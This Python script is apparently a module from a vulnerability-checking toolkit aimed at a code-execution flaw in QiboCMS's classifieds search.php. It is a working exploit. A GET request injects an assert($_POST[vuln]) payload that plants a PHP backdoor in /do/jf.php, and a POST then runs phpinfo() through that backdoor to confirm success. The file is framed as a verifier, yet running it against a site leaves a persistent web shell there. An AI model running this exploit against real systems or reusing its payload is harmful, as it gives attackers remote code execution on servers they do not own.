#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: qibo分类系统search.php 代码执行
referer: http://www.wooyun.org/bugs/wooyun-2015-0122599
author: Lucifer
description: search.php代码执行。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class qibocms_search_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/new/fenlei/search.php?mid=1&action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack=jfadmin&action=addjf&Apower[jfadmin_mod]=1&fid=1&title=${@assert($_POST[vuln])}"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            vulnurl = self.url + "/do/jf.php"
            post_data = {
                "vuln":"phpinfo();"
            }
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                cprint("[+]存在qibo分类系统search.php 代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
                return True, vulnurl, "qibo分类系统search.php 代码执行", payload, req.text
            else:
                cprint("[-]不存在qibocms_search_code_exec漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = qibocms_search_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()